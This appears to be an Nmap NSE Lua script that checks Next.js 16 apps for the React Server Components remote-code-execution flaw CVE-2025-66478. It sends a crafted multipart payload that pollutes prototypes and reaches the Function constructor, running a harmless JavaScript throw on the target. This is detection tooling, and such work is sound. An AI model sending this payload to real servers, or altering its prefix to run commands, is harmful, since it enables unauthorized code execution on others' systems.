local http = require "http"
local shortport = require "shortport"
local string = require "string"

description = [[
Detection script for Next.js RSC RCE (CVE-2025-66478) style behavior on Next.js 16 apps.

The script sends a crafted React Server Components (RSC) multipart/form-data
request to "/", similar to public PoCs, and inspects the text/x-component
stream for a JSON-encoded "digest" field. If a digest is present, the target
is considered vulnerable to RSC digest exposure and likely affected by
CVE-2025-66478-style issues.

NOTE:
- This checker does not execute arbitrary OS commands; it only exercises
  the RSC deserialization / error path and checks for digest propagation.
- Use only in controlled / authorized environments.
]]

author = "hxorz"
license = "Same as Nmap"
categories = {"vuln", "intrusive"}

-- Lab Next.js 16 app usually listens on TCP/3001
portrule = shortport.portnumber(3001, "tcp")

action = function(host, port)
  if port.state ~= "open" then
    return
  end

  -- Payload structurally similar to the public Next.js RSC PoCs,
  -- but with a harmless digest assignment instead of an OS command.
  local payload =
"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n" ..
"Content-Disposition: form-data; name=\"0\"\r\n\r\n" ..
"{\"then\":\"$1:__proto__:then\",\"status\":\"resolved_model\",\"reason\":-1," ..
"\"value\":\"{\\\"then\\\":\\\"$B1337\\\"}\"," ..
"\"_response\":{\"_prefix\":\"throw Object.assign(new Error('NEXT_REDIRECT'), {digest:'NEXTJS_RSC_66478_CHECK'});\",\"_chunks\":\"$Q2\",\"_formData\":{\"get\":\"$1:constructor:constructor\"}}}\r\n" ..
"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n" ..
"Content-Disposition: form-data; name=\"1\"\r\n\r\n" ..
"\"$@0\"\r\n" ..
"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n" ..
"Content-Disposition: form-data; name=\"2\"\r\n\r\n" ..
"[]\r\n" ..
"------WebKitFormBoundaryx8jO2oVc6SWP3Sad--\r\n"

  local options = {
    header = {
      ["Content-Type"] = "multipart/form-data; boundary=----WebKitFormBoundaryx8jO2oVc6SWP3Sad",
      ["Next-Action"]  = "x",
      ["X-Nextjs-Html-Request-Id"] = "NMAP-RSC-CHECK",
      ["X-Nextjs-Request-Id"]      = "NMAP-RSC-CHECK",
      ["User-Agent"]   = "nmap-nextjs-rsc-66478-check"
    },
    timeout = 8000
  }

  local resp = http.post(host, port, "/", options, payload)
  if not resp then
    return
  end

  local status  = resp.status or 0
  local headers = resp.header or {}
  local body    = resp.body or ""

  local ctype = headers["Content-Type"] or headers["content-type"] or ""
  if not ctype:match("text/x%-component") then
    return
  end

  -- Any digest in the RSC stream is a strong indicator of vulnerable behavior.
  local digest = body:match('%"digest"%s*:%s*"(.-)"')

  if digest then
    local out = {}
    out[#out+1] = "VULNERABLE: Next.js RSC digest behavior detected (CVE-2025-66478-style)."
    out[#out+1] = ("HTTP status: %d"):format(status)
    out[#out+1] = ("Content-Type: %s"):format(ctype)
    out[#out+1] = ("Observed digest: %s"):format(digest)
    out[#out+1] = "NOTE: This confirms RSC digest exposure. In real deployments,"
    out[#out+1] = "      further PoC validation may convert this into code execution."

    return table.concat(out, "\n")
  end

  return
end
